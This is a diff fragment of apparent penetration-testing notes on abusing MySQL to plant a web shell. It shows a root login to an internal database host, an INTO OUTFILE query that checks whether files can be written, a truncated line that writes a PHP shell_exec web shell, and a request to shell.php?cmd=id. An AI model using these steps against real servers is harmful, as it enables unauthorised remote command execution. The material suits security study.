@@ -36,7 +36,7 @@
 - __```mysql -h 10.0.1.22 -u root```__
 - __```select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;```__
   - > __if executed, confirms the ability to write files on the web server.__
-
+- __```select '<?php $output=shell_exec
 - __Now navigate to that path where you write the `shell.php`__
   - > __```<url>/shell.php?cmd=id```__
 
